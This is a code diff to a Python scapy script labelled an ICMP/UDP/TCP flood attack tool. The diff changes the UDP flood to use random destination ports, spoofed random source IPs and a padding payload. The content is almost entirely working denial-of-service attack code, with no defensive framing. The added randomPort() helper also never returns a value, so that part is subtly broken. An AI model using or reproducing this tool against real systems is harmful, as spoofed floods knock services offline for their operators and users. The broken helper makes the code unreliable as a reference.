@@ -3,7 +3,7 @@ from scapy.all import *
 from random import randint
 from argparse import ArgumentParser
 
-
+data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 # ICMP/UDP/TCP Flood Attack Tool
 def main():
     parser = ArgumentParser()
@@ -25,7 +25,7 @@ def main():
     if args.SynFlood:
         SynFlood(dstIP, dstPort, repeat)
     elif args.UDPFlood:
-        UDPFlood(dstIP, dstPort, repeat)
+        UDPFlood(dstIP, repeat)
     elif args.ICMPFlood:
         ICMPFlood(dstIP, repeat)
     else:
@@ -34,6 +34,8 @@ def main():
 def randomSrcIP():
     ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
     return ip 
+def randomPort():
+    port = randint(0, 65535)
 
 def SynFlood(dstIP,dstPort,repeat):
     for x in range(int(repeat)):
@@ -57,16 +59,15 @@ def SynFlood(dstIP,dstPort,repeat):
 def HTTPFlood(dstIP,dstPort,repeat):
     pass
 
-def UDPFlood(dstIP,dstPort,repeat):
+def UDPFlood(dstIP,repeat):
     for x in range(int(repeat)):
         IP_Packet = IP()
         IP_Packet.src = randomSrcIP()
         IP_Packet.dst = dstIP
 
         UDP_Packet = UDP()
-        UDP_Packet.sport = 80
-        UDP_Packet.dport = dstPort
-        send(IP_Packet/UDP_Packet,verbose=0)
+        UDP_Packet.dport = randomPort()
+        send(IP_Packet/UDP_Packet/Raw(load=data))
 
 def ICMPFlood(dstIP,repeat):
     for x in range(int(repeat)):
